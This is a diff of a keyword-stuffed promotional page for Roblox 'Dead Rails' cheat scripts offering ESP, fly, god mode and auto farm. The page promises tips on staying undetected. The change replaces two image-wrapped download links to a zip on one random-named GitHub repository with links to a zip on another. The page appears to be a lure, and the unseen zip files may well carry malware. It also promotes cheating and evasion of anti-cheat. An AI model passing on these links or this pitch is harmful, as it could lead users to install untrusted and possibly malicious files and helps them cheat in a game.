@@ -3,10 +3,10 @@
 Looking for the **best Roblox Dead Rails Script** in 2025? Whether you’re hunting for a **Pastebin link**, a full **GUI**, or just want to dominate the Dead Rails game with **ESP, fly, god mode, auto farm**, or other hacks — you’ve landed on the ultimate resource. This article covers everything you need to know about **Dead Rails Roblox scripts**, how to use them, where to get them, and how to stay undetected while doing it.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 ---
